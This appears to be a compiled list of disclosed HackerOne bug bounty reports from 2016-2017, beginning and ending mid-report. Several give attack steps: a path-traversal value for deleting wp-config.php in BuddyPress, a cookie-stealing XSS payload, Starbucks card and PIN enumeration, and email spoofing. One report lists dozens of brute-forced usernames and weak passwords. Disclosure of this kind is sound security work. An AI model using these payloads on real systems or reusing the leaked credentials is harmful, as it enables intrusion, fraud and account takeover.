In order to get the idea how to cause **openssl_verify** to return -1all you need is to provide valid signature towards public key from different type. Check the uploaded files and execute them in the CMD in the following order:
```
php genkey1.php
php genkey2.php
php PoC.php
```

---

### [Email Length Verification ](https://hackerone.com/reports/263589)

- **Report ID:** `263589`
- **Severity:** High
- **Weakness:** Uncategorized
- **Program:** Legal Robot
- **Reporter:** @husnainiqbal01
- **Bounty:** - usd
- **Disclosed:** 2017-08-26T20:17:37.803Z
- **CVE(s):** -

**Vulnerability Information:**

Hi Team, 
Hope you are good. I found your website app.legalrobot.com vulnerable to this vulnerability.
Bug: Improper authentication - generic 
Description:
Dont know much about the websites that how they stored email address.Email addresses are stored as VARCHAR(128) But here your website legalrobot dont verify the length of an email address upon registration which allowed the attackers to bypass the allowed email-domains defined in auth.email-domains.

How to Exploit:
Exploiting this is much Easy
Get an email address of 128 characters long. StackOverflow answer indicates that the maximum length of an email address is 254 characters.Then register with your 128 character email address with @allowed-domain.com appended to it. The @allowed-domain.com part will be truncated because MySQL can’t store it, and you will receive a verification email on your 128 character email address.

It will be much easy if you are using gmail if we keep
ihusnain49@gmail.com, you will receive all mails sent to
ihusnain49+aaaaaaaaaaa…aaa@gmail.com.  

References: 
For reference watch this video : https://www.youtube.com/watch?v=o8-0hwaUB4I&feature=youtu.be and you will came to know about the vulnerability of your website. you can also see this report as a reference because this is the same vulnerability as this report is : https://hackerone.com/reports/2224 

I reccomended you two open both of the links. 

Reference 1:  https://www.youtube.com/watch?v=o8-0hwaUB4I&feature=youtu.be 

Reference 2 : https://hackerone.com/reports/2224 

Proof of concept:
I  register an account on legalrobot with this email ihusnain49+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa..aaa@gmail.com
and I received the mail on ihusnain49@gmail.com because the other part gets truncated. 

Screenshots for Proof of concept: 

Attaching some screen shots for proof of concept in which you can clearly see. 

Thanks 
Regards: 
Husnain Iqbal

---

### [Restaurant payment information leakage](https://hackerone.com/reports/252043)

- **Report ID:** `252043`
- **Severity:** Critical
- **Weakness:** Uncategorized
- **Program:** Eternal
- **Reporter:** @adibou
- **Bounty:** - usd
- **Disclosed:** 2017-08-24T11:55:28.240Z
- **CVE(s):** -

**Summary (team):**

An endpoint was leaking banking information of restaurant owners: Bank Name, Account number etc.

Thanks @nbsp for reporting this.

---

### [[Buddypress] Arbitrary File Deletion through bp_avatar_set](https://hackerone.com/reports/183568)

- **Report ID:** `183568`
- **Severity:** High
- **Weakness:** Uncategorized
- **Program:** WordPress
- **Reporter:** @mopman
- **Bounty:** - usd
- **Disclosed:** 2017-08-22T18:04:10.313Z
- **CVE(s):** -

**Vulnerability Information:**

Hi,
The bp_avatar_set action in BuddyPress when cropping avatars allows an attacker to arbitrarily delete a file the webserver can delete through the 'original_file' parameter.

For example:

* Create a user on a Buddypress-powered Wordpress instance (any user is OK, doesn't need to be admin, just needs to have the ability to change it's own avatar in the Buddypress profile which is normal).
* Navigate to the avatar change URL for example /members/<username>/profile/change-avatar/ on my install.
* Click the button to upload an image and select any valid image. Allow the first request which uploads this image to submit as normal.
* Select the crop button, but do not allow the request to complete (I used Burp and enabled intercept mode). Modify the request to change the original_file parameter to point to a file you wish to delete, traversing up with ../.. if needed. So for example where my legitimate param was:

original_file=http%3A%2F%2Flocalhost%2F~sam%2Fwordpress%2Fwp-content%2Fuploads%2Favatars%2F2%2Fmy_ugly_face.jpg

Change to:

original_file=http%3A%2F%2Flocalhost%2F~sam%2Fwordpress%2Fwp-content%2Fuploads%2Favatars%2F2%2F../../../../../wp-config.php

Remember it will be in a numbered folder probably, so you need one more .. than expected from the URL. You can upload an image for real to see how the path ends up for guidance on this if you're an attacker and don't know the folder structure.

The wp-config.php file will be deleted when unlink() is called and the blog will then be unavailable, of course, in this case.

This path needs to be somehow validated such that it can only delete uploaded avatars (constraining to the upload directory would still allow you to delete, say, other users avatars, or other uploaded files, which would still make me sad :()

Let me know if you have any trouble reproducing or need any further info - I think I explained OK, but it is very late here. ;)

o/

---

### [Possible subdomain takeover at openapi.starbucks.com](https://hackerone.com/reports/241503)

- **Report ID:** `241503`
- **Severity:** High
- **Weakness:** Uncategorized
- **Program:** Starbucks
- **Reporter:** @benoculars
- **Bounty:** - usd
- **Disclosed:** 2017-08-15T04:48:56.125Z
- **CVE(s):** -

**Summary (team):**

@benoculars was able to take advantage of a process flaw to use some of the space provided for openapi.starbucks.com.  While we were still securely serving content from this domain and it did not impact users or operations, it would have been possible for @benoculars to serve content from unique URLs not in use by our apps & services.

In the past, others have reported that they suspected this to be vulnerable for subdomain takeover but no one had provided evidence.  Similarly, we initially closed this report, considering it a false positive.  

@benoculars then went one step further to provide a non-destructive PoC demonstrating his ability to serve content from our domain. Based on the PoC & repro steps provided, a flaw was identified in the approval process which required human interaction.  This was unique in that, given the root cause, it may not have always resulted in a successful takeover.
To resolve the issue, operational and platform code changes were introduced.

Thanks @benoculars for going the extra step to create that PoC & answer our questions about repro steps.  Nice work!

---

### [Lack of Controls Allowing for Card and PIN Enumeration Leading to Fraud](https://hackerone.com/reports/198494)

- **Report ID:** `198494`
- **Severity:** High
- **Weakness:** Uncategorized
- **Program:** Starbucks
- **Reporter:** @kylecolson
- **Bounty:** - usd
- **Disclosed:** 2017-07-01T02:15:32.468Z
- **CVE(s):** -

**Vulnerability Information:**

**Summary:**
The pages https://www.starbucks.com/account/card/addcard and https://www.starbucks.com/account/card/Balance do not properly enforce security controls to limit POST requests. This bug allows attackers to successfully hijack a loaded Starbucks card and transfer all the funds into their own account. Cards linked with auto-reload features could exponentially increase fraud. 
*NOTE: You will need to pass primary authentication before testing these pages. I have set up a temporary account for this purpose.*

**Card Enumeration:**
In a POST request to the above https://www.starbucks.com/account/card/addcard URL, if an attacker sets the Register.MyCard attribute to “FALSE” they can enumerate the 16-digit Card Number without limits. 
Another important note is all Starbucks locations have unactivated cards at their registers. It is highly possible for a threat actor to obtain a 16-digit card number from the next card in line, and sit on the account until it has been loaded up. Furthermore, in my research I've discovered each card only increments a singular digit in their 16-digit number. Because of this, a threat actor can easily discern which cards are about to be purchased, as well as which cards have been recently purchased.
{F152532}

**PIN Enumeration:**
In a POST request to the second https://www.starbucks.com/account/card/Balance URL, an attacker can check the PIN of a card they’ve already added via the previous /addcard Card Enumeration method. 
If an attacker already knows the 16-digit card number (via Starbucks stores), with the original POST request to the https://www.starbucks.com/account/card/addcard URL, if an attacker sets the Register.MyCard attribute to “TRUE” they can enumerate the 8-digit PIN number without limits.
Due to this, an attacker is able to successfully test every PIN number against 16-digit card data.
{F152533}
{F152534}

**Fraud/Risk:**
If an attacker is able to successfully validate PIN and Card information, they now have full access to all funds in the account. At this point they are able to commit fraudulent purchases and even migrate funds off the account onto their own card. Cards linked with auto-reload features could exponentially increase fraud damages. 
{F152535}

**Documentation:**
My test card was used in this demonstration. On the attached image, you can see the card number ending in 4769 was successfully processed. In the second image, you can see the PIN correctly enumerating once the PIN ending in 89 was processed.

**Remediation:**
My recommendation is to add velocity checks to both the /addcard and /Balance pages when attempting to add a Starbucks gift card. Additionally, CAPTCHA can be used as another authorization process. 

Please let me know if you need additional information to help triage this bug.
Thanks!

---

### [Parameter tampering can result in product price manipulation](https://hackerone.com/reports/218748)

- **Report ID:** `218748`
- **Severity:** High
- **Weakness:** Uncategorized
- **Program:** Adobe
- **Reporter:** @khalidamin
- **Bounty:** - usd
- **Disclosed:** 2017-06-14T21:42:56.130Z
- **CVE(s):** -

**Summary (team):**

Parameters set during the shopping cart checkout workflow are vulnerable to tampering.  By intercepting POST requests and manipulating the XML payload, product prices could be set to arbitrary values.

**Summary (researcher):**

P.O.C Video URL: https://youtu.be/3VMlV7j_yzg

---

### [Stored XSS templates -> 'call for action' feature](https://hackerone.com/reports/237927)

- **Report ID:** `237927`
- **Severity:** High
- **Weakness:** Uncategorized
- **Program:** Mixmax
- **Reporter:** @r0h17
- **Bounty:** - usd
- **Disclosed:** 2017-06-09T17:41:09.049Z
- **CVE(s):** -

**Vulnerability Information:**

Hi Jeff,

Reporting the Stored XSS in template section on 'call for action' button. (Already discussed in mail)
1] Login to Mixmax and navigate to template section
2] Click on enhance and select call for action button
3] Enter anything in button text and in URL enter XSS payload (javascript:alert(document.cookie))
4] Insert the button and click it to execute XSS.

Impact : XSS can be stored in template and when Team manager/admin uses that template and clicks the button , our XSS executes 

Thank you

---

### [doc.owncloud.com: CVE-2015-5477 BIND9 TKEY Vulnerability + Exploit (Denial of Service)](https://hackerone.com/reports/217381)

- **Report ID:** `217381`
- **Severity:** High
- **Weakness:** Uncategorized
- **Program:** ownCloud
- **Reporter:** @0xsamar
- **Bounty:** - usd
- **Disclosed:** 2017-06-01T12:18:55.110Z
- **CVE(s):** CVE-2015-5477

**Summary (team):**

BIND9 TKEY Vulnerability + Exploit (Denial of Service)

---

### [[██████████.gnip.com] .htpasswd disclosure](https://hackerone.com/reports/219197)

- **Report ID:** `219197`
- **Severity:** Critical
- **Weakness:** Uncategorized
- **Program:** X / xAI
- **Reporter:** @rbcafe
- **Bounty:** - usd
- **Disclosed:** 2017-05-26T23:01:02.204Z
- **CVE(s):** -

**Vulnerability Information:**

Greetings,

There is a .htpasswd disclosure on your subdomain :

- Go to : http://█████████.gnip.com/.htpasswd
- previewgnip:██████

{F173925}

Fix : 

Protect the htpasswd file

---

### [[URGENT] Opportunity to publish tweets on any twitters account](https://hackerone.com/reports/208978)

- **Report ID:** `208978`
- **Severity:** High
- **Weakness:** Uncategorized
- **Program:** X / xAI
- **Reporter:** @kedrischh
- **Bounty:** - usd
- **Disclosed:** 2017-05-22T22:44:42.815Z
- **CVE(s):** -

**Summary (team):**

The reporter discovered a flaw in the handling of Twitter Ads Studio requests which allowed an attacker to tweet as any user. By sharing media with a victim user and then modifying the post request with the victim's account ID the media in question would be posted from the victim's account. This bug was patched immediately after being triaged and no evidence was found of the flaw being exploited by anyone other than the reporter.

**Summary (researcher):**

Write-up of the vulnerability here: https://medium.com/@kedrisec/publish-tweets-by-any-other-user-6c9d892708e3

---

### [Email Spoofing Vulnerability from nextcloud.](https://hackerone.com/reports/229599)

- **Report ID:** `229599`
- **Severity:** High
- **Weakness:** Uncategorized
- **Program:** Nextcloud
- **Reporter:** @cloudyvirus
- **Bounty:** - usd
- **Disclosed:** 2017-05-18T11:49:07.282Z
- **CVE(s):** -

**Vulnerability Information:**

Hi nextcloud,
Here is Shaifullah Shaon (Black_EyE), An Ethical Hacker.
a white hat cyber security researcher from Bangladesh reporting a serious
[3'rd ranking in OWASP] security vulnerability on your system.


There is an Email Spoofing Vulnerability from nextcloud.

Steps to reproduce:
1) Go to http://emkei.cz/
2) Fill "From Email" field to support@nextcloud.com or any other nextcloud email.
3) Fill the victim's address (your address) to "TO" field and fill in other details as you wish.
You will receive email from nextcloud Support Team.
Recheck it, 

Reference:
https://hackerone.com/reports/575
https://hackerone.com/reports/182467

Thank you for time and consideration you provided for reading my report.
Note: If you don't find it in your inbox, see spam folder. If the victim is using
Gmail account it might be in spam folder. In other mailing service like nextcloud it is
directly recieved in inbox.

Proof as Video Concept (unlisted): https://youtu.be/yPAcyydlaMg

NB: If you Informative it, Then Want to told you that,  Today or tomorrow Wannacry Ransomware are shared by email spoofing. Remember it. 

Your sincerely,
Shaifullah Shaon
shaon.durjoy@gmail.com

---

### [Nextcloud Server Remote Command Execution](https://hackerone.com/reports/226896)

- **Report ID:** `226896`
- **Severity:** High
- **Weakness:** Uncategorized
- **Program:** Nextcloud
- **Reporter:** @sniperpex
- **Bounty:** - usd
- **Disclosed:** 2017-05-10T09:02:11.391Z
- **CVE(s):** -

**Vulnerability Information:**

Hy NextCloud Security Team i found a critical vulnerability (RCE) :

Nextcloud Server 11.0.2 is affected by a critical vulnerability, which gives to the attacker complete permission to run a system command. 

The root cause is insufficient validation of arguments to the exec function.

Vulnerable Code (498 - 525) /lib/private/legacy/helper.php:
===================
public static function findBinaryPath($program) {
		$memcache = \OC::$server->getMemCacheFactory()->create('findBinaryPath');
		if ($memcache->hasKey($program)) {
			return $memcache->get($program);
		}
		$result = null;
		if (self::is_function_enabled('exec')) {
			$exeSniffer = new ExecutableFinder();
			// Returns null if nothing is found
			$result = $exeSniffer->find($program); 
			if (empty($result)) {
				$paths = getenv('PATH');
				if (empty($paths)) {
					$paths = '/usr/local/bin /usr/bin /opt/bin /bin';
				} else {
					$paths = str_replace(':',' ',getenv('PATH'));
				}
				$command = 'find ' . $paths . ' -name ' . escapeshellarg($program) . ' 2> /dev/null';
				exec($command, $output, $returnCode);
				if (count($output) > 0) {
					$result = escapeshellcmd($output[0]);
				}
			}
		}
		// store the value for 5 minutes
		$memcache->set($program, $result, 300);
		return $result;
	}

**Summary (team):**

While we appreciate the reporter's enthusiasm we'd like to note that the code is only called with hard-coded values and trusted input. Until now the reporter has failed to provide us with a proof of concept for this issue.

The fact that a function can take input and actually evaluates it is by itself not a security risk unless user input is passed to this function. Which we fail to see here looking at https://github.com/search?q=user%3Anextcloud+findBinaryPath&type=Code&utf8=%E2%9C%93

As the reporter claimed to have requested a CVE identifier for this issue ([CVE-2017-6959](http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=2017-6959)) we have publicly disclosed this issue to dispute this CVE.

------

**Update:** [The CVE has been rejected.](http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=2017-6959)

---

### [I am because bug](https://hackerone.com/reports/226094)

- **Report ID:** `226094`
- **Severity:** Critical
- **Weakness:** Uncategorized
- **Program:** Paragon Initiative Enterprises
- **Reporter:** @b69b1b97b19c1c71b0eed85
- **Bounty:** - usd
- **Disclosed:** 2017-05-05T06:04:06.382Z
- **CVE(s):** -

**Vulnerability Information:**

I'm because I hacker found bug because I report this bug I want to report a bug and because want some $$$$ so please because you are telling me how much you pay money so I give you bug.

Me because very poor :'( want money because father :'(
{F181832}
 

Thank you wish you because pay lots $$$$$$$$

---

### [I am because bug](https://hackerone.com/reports/226097)

- **Report ID:** `226097`
- **Severity:** Critical
- **Weakness:** Uncategorized
- **Program:** Nextcloud
- **Reporter:** @b69b1b97b19c1c71b0eed85
- **Bounty:** - usd
- **Disclosed:** 2017-05-04T14:23:27.262Z
- **CVE(s):** -

**Vulnerability Information:**

I'm because I hacker found bug because I report this bug I want to report a bug and because want some $$$$ so please because you are telling me how much you pay money so I give you bug.

Me because very poor :'( want money because father :'(
{F181820}
 

Thank you wish you because pay lots $$$$$$$$

---

### [takeover a lot of accounts](https://hackerone.com/reports/180388)

- **Report ID:** `180388`
- **Severity:** High
- **Weakness:** Uncategorized
- **Program:** Eternal
- **Reporter:** @yipman
- **Bounty:** - usd
- **Disclosed:** 2017-03-08T13:00:44.570Z
- **CVE(s):** -

**Vulnerability Information:**

Weak password may lead to breakthrough many accounts I have been able to penetrate more than 100 account now.
██████

These are some of the accounts,
███

(Username )	(password)	(Timeout)	(Length)	(the response)
maryanne	123456	false	2241	"status":"true","name":"Mary Anne Gonzales","isNew":false,"user_id":32173616
dermot	        123456	false	2235	"status":"true","name":"Dermot Halpin","isNew":false,"user_id":7454691
cecelia	        123456	false	2234	"status":"true","name":"Nikhil Jain","isNew":false,"user_id":35506188
mel	        123456	false	2234	"status":"true","name":"Melbournian","isNew":false,"user_id":23666776
ade	        123456	false	2233	"status":"true","name":"Ade Ramone","isNew":false,"user_id":21373603
joanne	        123456	false	2233	"status":"true","name":"Whatisthis","isNew":false,"user_id":23405975
cristiano	123456	false	2232	"status":"true","name":"Cristiano","isNew":false,"user_id":36173575
ken	        123456	false	2207	"status":"true","name":"Kentv34","isNew":false,"user_id":10913421
larissa	        123456	false	2207	"status":"true","name":"Larissa","isNew":false,"user_id":23994281
alfred	        123456	false	2206	"status":"true","name":"Alfred","isNew":false,"user_id":22842777
jordon	        123456	false	2206	"status":"true","name":"Jordon","isNew":false,"user_id":23655216
maris	        123456	false	2206	"status":"true","name":"Ozwaee","isNew":false,"user_id":10927081
rowena	        123456	false	2206	"status":"true","name":"Rowena","isNew":false,"user_id":33832164
jan	        123456	false	2205	"status":"true","name":"Nkfgk","isNew":false,"user_id":11762071
lucas	        123456	false	2205	"status":"true","name":"Lucas","isNew":false,"user_id":24011188
maria	        123456	false	2205	"status":"true","name":"Maria","isNew":false,"user_id":10890321
price          	123456	false	2205	"status":"true","name":"Price","isNew":false,"user_id":12126991
ricky	        123456	false	2205	"status":"true","name":"Ricky","isNew":false,"user_id":25249282
stefan     	123456	false	2205	"status":"true","name":"Fabio","isNew":false,"user_id":29101376
brad    	123456	false	2204	"status":"true","name":"Brad","isNew":false,"user_id":22917465
juan    	123456	false	2204	"status":"true","name":"Juan","isNew":false,"user_id":25608209
bunny	        123456	false	2203	"status":"true","name":"Bunny","isNew":false,"user_id":334327
dolly	        123456	false	2203	"status":"true","name":"Dolly","isNew":false,"user_id":341259
lia	        123456	false	2203	"status":"true","name":"Lia","isNew":false,"user_id":25082436
niki        	123456	false	2202	"status":"true","name":"Niki","isNew":false,"user_id":341296
katherine	12345	"status":"true","name":"Burgers Plus Green Mountain","isNew":false,"user_id":23478827
had	        qwerty	"status":"true","name":"M&#039;lbFoodCritic","isNew":false,"user_id":24219454
kristine	qwerty	"status":"true","name":"Kristine Dela Cruz","isNew":false,"user_id":36549534
chelsea	        12345	"status":"true","name":"Chelsea Ronald","isNew":false,"user_id":33920791
kaleb	        12345	"status":"true","name":"Kaleb Lawrence","isNew":false,"user_id":33920508
april	        12345	"status":"true","name":"April Hensley","isNew":false,"user_id":21251960
nana	        12345678	"status":"true","name":"Sohal Patel","isNew":false,"user_id":22249776
amelia	        12345	"status":"true","name":"Amelia Diaz","isNew":false,"user_id":34195947
hale	        12345	"status":"true","name":"Hale Cansoy","isNew":false,"user_id":18833440
jill      	12345	"status":"true","name":"Jillandjack","isNew":false,"user_id":33879337
joey	        qwerty	"status":"true","name":"Joe Niater","isNew":false,"user_id":22997389
prince	        123456789	"status":"true","name":"Prince Kumar","isNew":false,"user_id":591208
bill	        12345	"status":"true","name":"Bill Thomp","isNew":false,"user_id":22737478
den	        12345	"status":"true","name":"Ugur Sss","isNew":false,"user_id":19430947
laurence	12345	"status":"true","name":"Laurence","isNew":false,"user_id":33493224
lorraine	12345	"status":"true","name":"Lorraine","isNew":false,"user_id":33891274
charlie 	12345	"status":"true","name":"Charlie","isNew":false,"user_id":22617986
douglass	12345	"status":"true","name":"Douglas","isNew":false,"user_id":33533934
johnny     	12345	"status":"true","name":"John Alai","isNew":false,"user_id":732722
monty   	12345678	"status":"true","name":"Monty","isNew":false,"user_id":21669794
simon	        12345678	"status":"true","name":"Simon","isNew":false,"user_id":5161521
vinson	        qwerty	"status":"true","name":"Vinson","isNew":false,"user_id":28146375
carl	        123456789	"status":"true","name":"Carlos","isNew":false,"user_id":11993621
alicia	        12345	"status":"true","name":"Alicia","isNew":false,"user_id":22914207
chrisy      	12345	"status":"true","name":"Chrisy","isNew":false,"user_id":24264674
Any	        12345678	"status":"true","name":"Any","isNew":false,"user_id":32140552
any	        12345678	"status":"true","name":"Any","isNew":false,"user_id":32140552
clint      	12345	"status":"true","name":"Clint","isNew":false,"user_id":20563177
dante     	12345	"status":"true","name":"Dante","isNew":false,"user_id":35031010
linda        	12345	"status":"true","name":"Linda","isNew":false,"user_id":22400357
sa	        12345678	"status":"true","name":"Sat","isNew":false,"user_id":4670091
west	        12345678	"status":"true","name":"West","isNew":false,"user_id":22873679
husain         	qwerty	"status":"true","name":"Free","isNew":false,"user_id":31480997
isis       	qwerty	"status":"true","name":"Isis","isNew":false,"user_id":25107230
george        	123456789	"status":"true","name":"George","isNew":false,"user_id":302853
hope	        123456789	"status":"true","name":"Hope","isNew":false,"user_id":23411815
alia         	12345	"status":"true","name":"Alia","isNew":false,"user_id":28162730
joel	        12345	"status":"true","name":"Joel","isNew":false,"user_id":25139013
stanly      	qwerty	"status":"true","name":"Ram","isNew":false,"user_id":36393602
katya      	12345	"status":"true","name":"Katya","isNew":false,"user_id":146048
WP	        12345	"status":"true","name":"Wp","isNew":false,"user_id":815499
stefano 	1234567	"status":"true","name":"Stefano","isNew":false,"user_id":20644506
keane	        1234567	"status":"true","name":"Keane","isNew":false,"user_id":21242717
DEMO	        12345678	"status":"false","name":"","isNew":"false","message":"The verification process for this email is yet
demo            12345678	"status":"false","name":"","isNew":"false","message":"The verification process for this email is yet
alex	        qwerty	"status":"false","name":"","isNew":"false","message":"The verification process for this email is yet
nani	        123456789	"status":"false","name":"","isNew":"false","message":"The verification process for this email is yet
james        	12345	"status":"false","name":"","isNew":"false","message":"The verification process for this email is yet

**Summary (team):**

Bruteforce attack in login api call lead to breakthrough some accounts. Fixed now.

---

### [Version 4.7.2 of wordpress is vulnerable](https://hackerone.com/reports/211206)

- **Report ID:** `211206`
- **Severity:** High
- **Weakness:** Uncategorized
- **Program:** Nextcloud
- **Reporter:** @demo--hacker
- **Bounty:** - usd
- **Disclosed:** 2017-03-07T17:38:20.703Z
- **CVE(s):** -

**Vulnerability Information:**

Hello team,

I observed that your website https://nextcloud.com still use wordpress 4.7.2

Version 4.7.2 of wordpress is vulnerable to :

Cross-site scripting (XSS)
Control characters can trick redirect URL validation
Cross-site scripting (XSS) via video URL in YouTube embeds
Cross-site scripting (XSS) via taxonomy term names
Cross-site request forgery (CSRF) in Press This leading to excessive use of server resources
Fix :

Upgrade to wordpress 4.7.3
More information : https://wordpress.org/news/2017/03/wordpress-4-7-3-security-and-maintenance-release/

Best regards
Rey Mark

---

### [GNIP subdomain take over](https://hackerone.com/reports/189548)

- **Report ID:** `189548`
- **Severity:** High
- **Weakness:** Uncategorized
- **Program:** X / xAI
- **Reporter:** @hussein98d
- **Bounty:** - usd
- **Disclosed:** 2017-02-06T01:59:02.263Z
- **CVE(s):** -

**Vulnerability Information:**

Hello,
Your subdomain at blog.gnipcentral.com is not well configured with allows subdomain take over as @fransoren explained in report #145224 .

PoC:
Go to http://blog.gnipcentral.com/ , you will be redirected to my domain http://testcloudfrontbug.s3-us-west-2.amazonaws.com/asd/index.html 


Please for more information visit the report made by @fransorosen, it's explained with all details possible.

Thanks,
Hussein

**Summary (researcher):**

Already received bounties from Twitter for bugs in acquisitions. But not this time because Twitter guys judge this subdomain take over to not be enough critical. Read the full report in case you need my point of view on this.

---

### [Jenkins](https://hackerone.com/reports/181849)

- **Report ID:** `181849`
- **Severity:** High
- **Weakness:** Uncategorized
- **Program:** Udemy
- **Reporter:** @top
- **Bounty:** - usd
- **Disclosed:** 2017-01-10T22:55:25.119Z
- **CVE(s):** -

**Summary (team):**

A  Jenkins server being developed for internal Continuous Integration was inadvertently left open to all users with a Github account.

**Summary (researcher):**

Open Jenkins server. Fixed really quick by Udemy team. Thanks!

---

### [Crash: Initialize Decimal with itself triggers an assertion](https://hackerone.com/reports/185775)

- **Report ID:** `185775`
- **Severity:** High
- **Weakness:** Uncategorized
- **Program:** shopify-scripts
- **Reporter:** @brakhane
- **Bounty:** 10000 usd
- **Disclosed:** 2016-12-16T20:24:30.867Z
- **CVE(s):** -

**Vulnerability Information:**

When `Decimal` is initialized with itself, a new (empty) `mpd_t` will be created. To fill it with a value, `to_s` of the current instance is called, which accesses the empty `mpd_t`. This triggers an assertion, which leads to a crash.

# Patch
I've created and attached a simple patch which just returns self when a Decimal is initialized with itself. Pretty simple, but should do the job (careful: I've created the patch after a 20h flight, could be... uhm, suboptimal).

# PoC
PoC does work on `https://www.mruby.science/runs`, but as it's not up2date that shouldn't really mean anything.

```
a = Decimal.new
a.initialize a
```

# Trace

```
$ gdb attach 10251
GNU gdb (GDB) 7.12
Copyright (C) 2016 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-pc-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
attach: No such file or directory.
Attaching to process 10251
Reading symbols from /home/simon/git/shopify/mruby-engine/ext/mruby_engine/mruby/build/host/bin/mirb...done.
Reading symbols from /usr/lib/libm.so.6...(no debugging symbols found)...done.
Reading symbols from /usr/lib/libreadline.so.7...(no debugging symbols found)...done.
Reading symbols from /usr/lib/libncursesw.so.6...(no debugging symbols found)...done.
Reading symbols from /usr/lib/libc.so.6...(no debugging symbols found)...done.
Reading symbols from /lib64/ld-linux-x86-64.so.2...(no debugging symbols found)...done.
0x00007f8de487f131 in pselect () from /usr/lib/libc.so.6
(gdb) c
Continuing.

Program received signal SIGABRT, Aborted.
0x00007f8de47d104f in raise () from /usr/lib/libc.so.6
(gdb) bt
#0  0x00007f8de47d104f in raise () from /usr/lib/libc.so.6
#1  0x00007f8de47d247a in abort () from /usr/lib/libc.so.6
#2  0x00007f8de47c9ea7 in __assert_fail_base () from /usr/lib/libc.so.6
#3  0x00007f8de47c9f52 in __assert_fail () from /usr/lib/libc.so.6
#4  0x000000000045a356 in mpd_msword (dec=0xa75980) at /home/simon/git/shopify/mruby-engine/ext/mruby_engine/mruby-mpdecimal/src/mpdecimal.c:218
#5  mpd_iszero (dec=dec@entry=0xa75980) at /home/simon/git/shopify/mruby-engine/ext/mruby_engine/mruby-mpdecimal/src/mpdecimal.c:331
#6  0x0000000000472fc0 in mpd_qformat_spec (dec=dec@entry=0xa75980, spec=spec@entry=0x7ffc8fdcd220, ctx=ctx@entry=0x9f8580, 
    status=status@entry=0x7ffc8fdcd28c) at /home/simon/git/shopify/mruby-engine/ext/mruby_engine/mruby-mpdecimal/src/io.c:1320
#7  0x00000000004738d5 in mpd_qformat (dec=0xa75980, fmt=fmt@entry=0x481177 "f", ctx=0x9f8580, status=status@entry=0x7ffc8fdcd28c)
    at /home/simon/git/shopify/mruby-engine/ext/mruby_engine/mruby-mpdecimal/src/io.c:1390
#8  0x000000000045602a in ext_decimal_to_s (state=0x9b1010, rself=...)
    at /home/simon/git/shopify/mruby-engine/ext/mruby_engine/mruby-mpdecimal/src/ext.c:220
#9  0x000000000040f6af in mrb_funcall_with_block (mrb=mrb@entry=0x9b1010, self=..., mid=<optimized out>, mid@entry=38, argc=<optimized out>, 
    argc@entry=0, argv=argv@entry=0x0, blk=..., blk@entry=...) at /home/simon/git/shopify/mruby-engine/ext/mruby_engine/mruby/src/vm.c:407
#10 0x000000000040fbcc in mrb_funcall_argv (mrb=mrb@entry=0x9b1010, self=..., self@entry=..., mid=mid@entry=38, argc=argc@entry=0, argv=argv@entry=0x0)
    at /home/simon/git/shopify/mruby-engine/ext/mruby_engine/mruby/src/vm.c:424
#11 0x0000000000403d23 in convert_type (raise=1 '\001', method=0x4810cd "to_s", tname=0x4813ea "String", val=..., mrb=0x9b1010)
    at /home/simon/git/shopify/mruby-engine/ext/mruby_engine/mruby/src/object.c:316
#12 mrb_convert_type (mrb=mrb@entry=0x9b1010, val=..., type=type@entry=MRB_TT_STRING, tname=tname@entry=0x4813ea "String", 
    method=method@entry=0x4810cd "to_s") at /home/simon/git/shopify/mruby-engine/ext/mruby_engine/mruby/src/object.c:338
#13 0x0000000000455927 in ext_decimal_initialize (state=0x9b1010, self=...)
    at /home/simon/git/shopify/mruby-engine/ext/mruby_engine/mruby-mpdecimal/src/ext.c:86
#14 0x000000000041150f in mrb_vm_exec (mrb=mrb@entry=0x9b1010, proc=<optimized out>, proc@entry=0x9b9020, pc=<optimized out>)
    at /home/simon/git/shopify/mruby-engine/ext/mruby_engine/mruby/src/vm.c:1165
#15 0x0000000000416d57 in mrb_vm_run (mrb=mrb@entry=0x9b1010, proc=proc@entry=0x9b9020, self=..., stack_keep=stack_keep@entry=2)
    at /home/simon/git/shopify/mruby-engine/ext/mruby_engine/mruby/src/vm.c:766
#16 0x00000000004028be in main (argc=<optimized out>, argv=<optimized out>)
    at /home/simon/git/shopify/mruby-engine/ext/mruby_engine/mruby/mrbgems/mruby-bin-mirb/tools/mirb/mirb.c:549
(gdb) info registers
rax            0x0	0
rbx            0x6	6
rcx            0x7f8de47d104f	140247400517711
rdx            0x0	0
rsi            0x7ffc8fdccc30	140722722098224
rdi            0x2	2
rbp            0x4ac565	0x4ac565
rsp            0x7ffc8fdccca8	0x7ffc8fdccca8
r8             0x0	0
r9             0x7ffc8fdccc30	140722722098224
r10            0x8	8
r11            0x246	582
r12            0xda	218
r13            0x4acbb8	4901816
r14            0x0	0
r15            0x7ffc8fdcd220	140722722099744
rip            0x7f8de47d104f	0x7f8de47d104f <raise+207>
eflags         0x246	[ PF ZF IF ]
cs             0x33	51
ss             0x2b	43
ds             0x0	0
es             0x0	0
fs             0x0	0
gs             0x0	0
(gdb) 
```

---

### [Nested attributes reject_if proc can be circumvented by providing "_destroy" parameter](https://hackerone.com/reports/90457)

- **Report ID:** `90457`
- **Severity:** High
- **Weakness:** Uncategorized
- **Program:** Ruby on Rails
- **Reporter:** @jcoyne
- **Bounty:** - usd
- **Disclosed:** 2016-02-12T23:10:52.833Z
- **CVE(s):** -

**Summary (team):**

Nested attributes rejection proc bypass in Active Record.

There is a vulnerability in how the nested attributes feature in Active Record
handles updates in combination with destroy flags when destroying records is
disabled. This vulnerability has been assigned the CVE identifier CVE-2015-7577.

Versions Affected:  3.1.0 and newer
Not affected:       3.0.x and older
Fixed Versions:     5.0.0.beta1.1, 4.2.5.1, 4.1.14.1, 3.2.22.1

Impact
------
When using the nested attributes feature in Active Record you can prevent the
destruction of associated records by passing the `allow_destroy: false` option
to the `accepts_nested_attributes_for` method. However due to a change in the
commit [a9b4b5d][1] the `_destroy` flag prevents the `:reject_if` proc from
